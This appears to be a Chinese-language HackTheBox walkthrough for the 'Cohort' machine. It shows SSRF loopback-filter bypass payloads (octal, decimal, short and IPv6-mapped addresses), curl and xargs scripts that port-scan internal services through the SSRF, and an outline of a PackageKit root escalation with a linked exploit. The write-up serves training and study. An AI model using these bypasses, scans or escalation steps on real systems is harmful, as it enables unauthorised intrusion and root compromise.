SSRF

浏览这个站点，发现在 /portal.html 处存在一个客户门户，提供的功能是：验证数据源 URL并向其发起请求。

对于接收 URL 并发起请求的功能点，我们都可以尝试 SSRF。

抓包可以发现，请求是通过 /api/validate 接口发送的。

尽管旁边的的 Notes 声称 For security, internal and loopback addresses are rejected.，但是我们还有很多绕过方式。

经过测试，被禁止的 URL 有：

1
2

curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://127.0.0.1"}'
curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://localhost"}'

但可以通过各种方式绕过：

1
2
3
4

curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://127.1"}' # 短格式
curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://0177.0.0.1"}' # 八进制
curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://2130706433"}' # 十进制
curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://[::ffff:127.0.0.1]"}' # v4 映射 v6

成功绕过检测之后，我们可以通过 SSRF 对靶机开放的端口，包括内网端口进行探测。

先探测一个不太可能开放的端口，了解未开放端口的回显。

1
2
3

┌──(root㉿kali)-[~/HTB/Cohort]
└─# curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://127.1:90"}'
{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}

写一个 bash 脚本测试前一万个端口的开放情况。

1
2
3
4

for p in $(seq 1 10000); do
  curl -sk --max-time 3 -X POST https://cohort.htb/api/validate \
    -d "{\"url\":\"http://127.1:$p/\"}" | grep -q 'Connection refused' || echo "OPEN: $p"
done

有几个细节需要注意。

"{\"url\":\"http://127.1:$p/\"}" 外层使用双引号，如果用单引号，$p 将不会被解析。

grep -q 为安静模式，不输出匹配到的文字，只返回退出状态码，找到匹配内容为0，否则非0。

上面的代码是串行的，也就是说探测完一个端口再去探测下一个，且由于 --max-time 超时设置为 3s，导致最坏的情况需要 30000s 才能扫完这一万个端口。

使用 xargs 并发加快扫描速度。

1
2
3
4

seq 1 10000 | xargs -P 30 -I {} sh -c '
curl -sk --max-time 3 -X POST https://cohort.htb/api/validate \
-d "{\"url\":\"http://127.1:{}/\"}" | grep -q "Connection refused" || echo "OPEN: {}"
'

-P 30 并发数为 30，-I {} 等价于刚才的 $p。

根据标题可知是 marimo，是新一代开源 Python 交互式笔记本，支持响应式执行。像电子表格一样，改一个单元格，自动把所有依赖它的单元格重新跑一遍。

访问 /api/version 即可查看其版本信息。

1
2

┌──(root㉿kali)-[~/HTB/Cohort]
└─# curl -sk -X POST https://cohort.htb/api/validate -d '{"url": "http://127.1:8888/api/version"}'
{"ok": true, "fetched_status": 200, "content_type": "text/plain; charset=utf-8", "preview": "0.20.4", "message": "Source reachable."}

可知版本为 0.20.4，该版本受到 CVE-2026-39987 影响，可导致未授权 RCE。但由于我们通过 SSRF 只能传 GET 请求，无法自定义请求包，所以此处通过 SSRF 利用不了。

但是由于 marimo 不仅限于回环地址，还可以通过每个笔记本电脑的动态主机名访问，只需在 cohort.htb 前加上 nb-<id>，nginx 会将主机名直接代理到 127.0.0.1:8888。

CVE-2026-41651 (Pack2TheRoot)

PackageKit 是 Linux 统一包管理抽象层，后台守护进程 packagekitd 以 root 运行，给图形界面提供安装/更新软件的 API，底层调用 apt/dnf/yum。

CVE-2026-41651，“Pack2TheRoot”，是 PackageKit 的 InstallFiles 处理中一个确定性的（非竞争性的）TOCTOU 漏洞。

快速连续调用两次 InstallFiles()——第一次使用 SIMULATE，跳过 polkit 提示，第二次使用真正的标志——让第二次调用在 GLib 的空闲回调运行之前覆盖缓存的事务状态。

然后，守护进程会以 root 用户身份安装第二个调用指向的内容，无需身份验证提示。由于它是确定性的，因此不存在竞争条件——它直接就能运行。

利用脚本：https://github.com/ashrafzaryouh/CVE-2026-41651
